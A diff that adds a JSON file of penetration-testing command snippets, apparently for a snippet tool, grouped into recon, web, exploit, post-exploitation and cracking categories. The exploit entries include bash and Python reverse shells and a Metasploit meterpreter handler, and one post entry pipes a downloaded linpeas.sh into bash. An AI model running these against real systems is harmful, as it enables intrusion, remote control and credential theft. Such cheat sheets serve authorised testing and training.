@@ -1,0 +1,214 @@
+{
+  "snippets": [
+    {
+      "id": "rec001",
+      "title": "Nmap full scan",
+      "category": "Recon",
+      "content": "nmap -sV -sC -p- --min-rate 5000 {TARGET}",
+      "favorite": true
+    },
+    {
+      "id": "rec002",
+      "title": "Nmap UDP top 100",
+      "category": "Recon",
+      "content": "nmap -sU --top-ports 100 {TARGET}",
+      "favorite": false
+    },
+    {
+      "id": "rec003",
+      "title": "Nmap quick scan",
+      "category": "Recon",
+      "content": "nmap -sV -sC --min-rate 3000 {TARGET}",
+      "favorite": false
+    },
+    {
+      "id": "rec004",
+      "title": "WhatWeb fingerprint",
+      "category": "Recon",
+      "content": "whatweb -a 3 http://{TARGET}",
+      "favorite": false
+    },
+    {
+      "id": "rec005",
+      "title": "WhoIs lookup",
+      "category": "Recon",
+      "content": "whois {TARGET}",
+      "favorite": false
+    },
+    {
+      "id": "web001",
+      "title": "Gobuster dirs",
+      "category": "Web",
+      "content": "gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50",
+      "favorite": true
+    },
+    {
+      "id": "web002",
+      "title": "Ffuf fuzz",
+      "category": "Web",
+      "content": "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://{TARGET}/FUZZ -mc 200,301,302,403",
+      "favorite": false
+    },
+    {
+      "id": "web003",
+      "title": "SQLMap basic",
+      "category": "Web",
+      "content": "sqlmap -u \"http://{TARGET}/page?id=1\" --dbs --batch",
+      "favorite": false
+    },
+    {
+      "id": "web004",
+      "title": "Curl headers",
+      "category": "Web",
+      "content": "curl -I -s http://{TARGET}",
+      "favorite": false
+    },
+    {
+      "id": "web005",
+      "title": "Nikto scan",
+      "category": "Web",
+      "content": "nikto -h http://{TARGET}",
+      "favorite": false
+    },
+    {
+      "id": "exp001",
+      "title": "MSF reverse TCP handler",
+      "category": "Exploit",
+      "content": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run\"",
+      "favorite": true
+    },
+    {
+      "id": "exp002",
+      "title": "Spawn PTY shell",
+      "category": "Exploit",
+      "content": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "favorite": false
+    },
+    {
+      "id": "exp003",
+      "title": "Netcat listener",
+      "category": "Exploit",
+      "content": "nc -lvnp {LPORT}",
+      "favorite": false
+    },
+    {
+      "id": "exp004",
+      "title": "Bash reverse shell",
+      "category": "Exploit",
+      "content": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+      "favorite": false
+    },
+    {
+      "id": "exp005",
+      "title": "Python reverse shell",
+      "category": "Exploit",
+      "content": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "favorite": false
+    },
+    {
+      "id": "post001",
+      "title": "Find SUID binaries",
+      "category": "Post",
+      "content": "find / -perm -4000 -type f 2>/dev/null",
+      "favorite": true
+    },
+    {
+      "id": "post002",
+      "title": "List login users",
+      "category": "Post",
+      "content": "cat /etc/passwd | grep -v nologin | grep -v false",
+      "favorite": false
+    },
+    {
+      "id": "post003",
+      "title": "Open ports",
+      "category": "Post",
+      "content": "ss -tlnp",
+      "favorite": false
+    },
+    {
+      "id": "post004",
+      "title": "Sudo rights",
+      "category": "Post",
+      "content": "sudo -l",
+      "favorite": false
+    },
+    {
+      "id": "post005",
+      "title": "Cron jobs",
+      "category": "Post",
+      "content": "cat /etc/crontab && ls -la /etc/cron.*",
+      "favorite": false
+    },
+    {
+      "id": "post006",
+      "title": "Writable files",
+      "category": "Post",
+      "content": "find / -writable -type f 2>/dev/null | grep -v proc",
+      "favorite": false
+    },
+    {
+      "id": "post007",
+      "title": "LinPEAS",
+      "category": "Post",
+      "content": "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash",
+      "favorite": false
+    },
+    {
+      "id": "cry001",
+      "title": "Hashcat MD5",
+      "category": "Crypto",
+      "content": "hashcat -m 0 {HASH_FILE} /usr/share/wordlists/rockyou.txt",
+      "favorite": false
+    },
+    {
+      "id": "cry002",
+      "title": "Hashcat NTLM",
+      "category": "Crypto",
+      "content": "hashcat -m 1000 {HASH_FILE} /usr/share/wordlists/rockyou.txt",
+      "favorite": false
+    },
+    {
+      "id": "cry003",
+      "title": "John wordlist",
+      "category": "Crypto",
+      "content": "john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE}",
+      "favorite": false
+    },
+    {
+      "id": "cry004",
+      "title": "Identify hash",
+      "category": "Crypto",
+      "content": "hash-identifier {HASH}",
+      "favorite": false
+    },
+    {
+      "id": "misc001",
+      "title": "Quick recon script",
+      "category": "Misc",
+      "content": "echo \"[*] Starting recon on {TARGET}\"\nnmap -sV -sC --min-rate 3000 {TARGET}\necho \"[*] Done\"",
+      "favorite": false
+    },
+    {
+      "id": "misc002",
+      "title": "Extract archive",
+      "category": "Misc",
+      "content": "tar -xvf {FILE}",
+      "favorite": false
+    },
+    {
+      "id": "misc003",
+      "title": "Base64 decode",
+      "category": "Misc",
+      "content": "echo \"{STRING}\" | base64 -d",
+      "favorite": false
+    },
+    {
+      "id": "misc004",
+      "title": "HTTP server Python",
+      "category": "Misc",
+      "content": "python3 -m http.server {PORT}",
+      "favorite": false
+    }
+  ]
+}
